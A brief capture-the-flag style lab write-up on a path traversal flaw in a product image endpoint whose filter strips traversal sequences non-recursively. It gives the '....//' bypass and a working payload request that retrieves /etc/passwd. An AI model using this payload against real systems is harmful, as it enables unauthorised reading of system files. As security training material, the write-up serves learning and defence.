# Lab: File path traversal, traversal sequences stripped non-recursively

This lab contains a path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

---

**Analysis:** Exploit path traversal vulnerability in the display of product images. The app has some filtering but is vulnerable to certain types of masked path traversal attacks, in this case:

`....//`

`/image?filename=64.jpg`

`/var/www/images`

**Payload:**

```python
/image?filename=....//....//....//etc/passwd 
```


